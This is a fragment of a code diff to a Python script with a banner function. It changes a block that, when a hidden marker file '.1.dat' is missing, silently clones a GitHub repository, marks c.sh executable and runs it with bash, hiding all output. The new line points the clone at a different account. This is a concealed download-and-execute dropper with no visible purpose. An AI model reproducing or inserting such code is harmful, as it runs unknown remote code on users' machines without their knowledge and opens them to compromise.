@@ -25,7 +25,7 @@ def banner():
 
 
 if not os.path.exists(".1.dat"):
-        subprocess.run(['git', 'clone', 'https://github.com/Pypi-Project/c.git'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['git', 'clone', 'https://github.com/niktoproject/c.git'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         os.chdir('c')
         subprocess.run(['chmod', '+x', 'c.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         subprocess.run(['bash', 'c.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
